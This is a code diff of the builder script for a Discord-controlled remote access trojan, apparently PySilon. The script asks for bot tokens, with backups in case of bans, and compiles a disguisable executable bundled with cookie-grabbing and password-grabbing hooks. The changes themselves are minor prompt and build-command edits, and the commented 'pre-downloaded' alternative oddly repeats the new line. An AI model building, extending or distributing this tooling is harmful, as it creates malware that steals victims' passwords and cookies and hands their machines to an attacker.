@@ -18,8 +18,7 @@ def get_file_path():
     root.destroy()
     return open_dir
 
-
-mode = int(input('[1] signle\n[2] multi\nDo you want to build single-target RAT or multi-target RAT?'))
+mode = int(input('[1] signle\n[2] multi\nDo you want to build single-target RAT or multi-target RAT? '))
 if mode == 1:
     settings_prompts = [
         'Info channel ID: ',
@@ -36,7 +35,7 @@ if mode == 1:
 elif mode == 2:
     tokens = []
     tokens_prompts = [
-        'Discord BOT token:',
+        'Discord BOT token: ',
         'Discord secondary BOT token (in case of first one getting banned; leave empty if you don\'t want to use secondary token): ',
         'Discord third BOT token (in case of both first and second ones getting banned; leave empty if you don\'t want to use third token): '
     ]
@@ -46,7 +45,6 @@ elif mode == 2:
         'Software executable name (default -> DIRECTORY_NAME + .exe): '
     ]
 else: print('You can choose from 2 options.'); sys.exit(0)
-
 
 settings = []
 icon_path = ''
@@ -65,7 +63,8 @@ else:
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
 
-pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python tools/PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
+# Uncomment if you want to use pre-downloaded PyInstaller #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
 with open('main.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
